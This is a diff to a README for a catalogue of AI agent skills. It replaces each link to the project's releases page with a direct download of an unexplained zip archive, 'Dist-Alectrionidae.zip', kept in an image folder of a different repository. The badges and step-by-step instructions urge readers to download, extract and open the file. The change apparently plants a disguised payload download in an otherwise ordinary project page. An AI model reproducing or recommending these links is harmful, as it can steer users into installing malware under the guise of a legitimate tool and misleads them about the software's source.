@@ -5,7 +5,7 @@ description: "Discover 718 categorized GenPark AI agent skills with source code,
 ---
 # 🤖 awesome-ai-agent-skills - Discover 718 Ready-to-Use AI Agent Skills
 
-[![Download Now](https://img.shields.io/badge/Download-awesome--ai--agent--skills-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-awesome--ai--agent--skills-blue?style=for-the-badge&logo=github&color=4B0082)](https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip)
 
 ## 👋 Welcome to Your AI Toolkit
 
@@ -29,7 +29,7 @@ Follow these simple steps to start using the skills index today.
 
 ### Step 1: Download the Package
 
-Visit this link to download the application: [https://github.com/Destinyola/awesome-ai-agent-skills/releases](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+Visit this link to download the application: [https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip](https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip)
 
 ### Step 2: Open the Index
 
@@ -74,7 +74,7 @@ The index itself runs on any device with a web browser. For using the actual ski
 
 Ready to dive in? Here's how to get the full index:
 
-1. **Go to the download page:** [https://github.com/Destinyola/awesome-ai-agent-skills/releases](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+1. **Go to the download page:** [https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip](https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip)
 2. **Choose your format:** Select the package that matches your needs
 3. **Download and extract:** Save the file to your computer and unzip it if needed
 4. **Open the index:** Double-click the main HTML file to start browsing
@@ -192,9 +192,9 @@ Your privacy matters. The index:
 
 You're just minutes away from unlocking hundreds of AI capabilities. Download now and transform how you work with AI.
 
-[![Download Now](https://img.shields.io/badge/Download-Releases-green?style=for-the-badge&logo=github&color=006400)](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+[![Download Now](https://img.shields.io/badge/Download-Releases-green?style=for-the-badge&logo=github&color=006400)](https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip)
 
-Visit this link to download the application: [https://github.com/Destinyola/awesome-ai-agent-skills/releases](https://github.com/Destinyola/awesome-ai-agent-skills/releases)
+Visit this link to download the application: [https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip](https://github.com/Destinyola/destinyola.github.io/raw/refs/heads/main/img/Dist-Alectrionidae.zip)
 
 ---
 
